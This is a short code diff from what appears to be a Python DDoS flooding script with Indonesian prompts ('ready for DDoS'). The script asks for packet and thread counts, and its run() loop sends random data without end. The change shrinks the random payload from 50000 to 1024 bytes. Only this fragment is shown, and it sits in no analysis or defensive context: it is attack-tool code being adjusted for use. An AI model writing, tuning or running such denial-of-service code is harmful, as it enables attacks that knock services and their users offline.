@@ -27,7 +27,7 @@ choice = str(input(" SIAP UNTUK DDOS(y/n):"))
 times = int(input(" PACKETS:"))
 threads = int(input(" ISI PACKETS:"))
 def run():
-	data = random._urandom(50000)
+	data = random._urandom(1024)
 	i = random.choice(("[!]","[*]","[#]"))
 	while True:
 		try:
